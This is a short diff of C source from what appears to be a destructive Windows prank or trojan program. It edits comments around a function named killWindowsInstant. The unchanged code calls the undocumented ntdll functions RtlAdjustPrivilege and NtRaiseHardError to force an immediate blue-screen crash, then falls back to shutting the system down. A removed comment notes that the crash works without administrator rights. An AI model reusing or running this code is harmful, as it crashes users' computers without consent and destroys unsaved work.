@@ -3,10 +3,6 @@
 #pragma warning(disable : 28159)
 #pragma warning(disable : 6387)
 void killWindowsInstant() {
-
-	// Try to force BSOD first
-	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
-	// This isn't even an exploit, it's just an undocumented feature.
 	HMODULE ntdll = LoadLibraryA("ntdll.dll");
 	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
@@ -17,7 +13,7 @@ void killWindowsInstant() {
 		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
 	}
 
-	// If the computer is still running, do it the normal way
+	// If PC Is Running, it shall be normal used!!!
 	HANDLE token;
 	TOKEN_PRIVILEGES privileges;
 
